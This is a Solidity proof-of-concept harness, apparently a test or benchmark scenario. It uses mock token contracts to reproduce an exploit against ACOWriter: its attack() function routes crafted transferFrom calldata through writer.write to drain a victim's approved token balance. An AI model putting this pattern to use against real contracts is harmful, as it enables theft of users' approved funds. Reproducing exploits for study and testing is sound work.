pragma solidity ^0.6.6;
import "./ACOWriter.sol";

contract MockERC20 {
    string public name = "Mock USD Coin"; string public symbol = "mUSDC"; uint8 public decimals = 6;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    receive() external payable {}
    function mint(address to,uint256 a) external { balanceOf[to]+=a; }
    function approve(address s,uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; }
    function transfer(address to,uint256 a) external returns(bool){ require(balanceOf[msg.sender]>=a); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){ require(balanceOf[f]>=a && allowance[f][msg.sender]>=a); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}
contract MockACO {
    mapping(address=>uint256) public balanceOf; address public strike; constructor(address s) public { strike=s; }
    function collateral() external pure returns(address){ return address(0); }
    function strikeAsset() external view returns(address){ return strike; }
    function mintToPayable(address a) external payable { balanceOf[a]+=msg.value; }
    function mintTo(address a,uint256 n) external { balanceOf[a]+=n; }
    function approve(address,uint256) external pure returns(bool){ return true; }
}
contract Scenario {
    ACOWriter public writer; MockERC20 public asset; MockACO public aco; address public victim; uint256 public constant INITIAL=1000000000;
    receive() external payable {}
    constructor() public { victim=address(this); asset=new MockERC20(); aco=new MockACO(address(asset)); writer=new ACOWriter(address(0),address(0x0000000000000000000000000000000000001234)); asset.mint(victim,INITIAL); asset.approve(address(writer),INITIAL); }
    function victimBalance() external view returns(uint256){ return asset.balanceOf(victim); }
    function assetAddress() external view returns(address){ return address(asset); }
    function attack(address recipient) external { uint256 n=asset.balanceOf(victim); bytes memory d=abi.encodeWithSignature("transferFrom(address,address,uint256)",victim,recipient,n); writer.write{value:1}(address(aco),1,address(asset),d); }
}
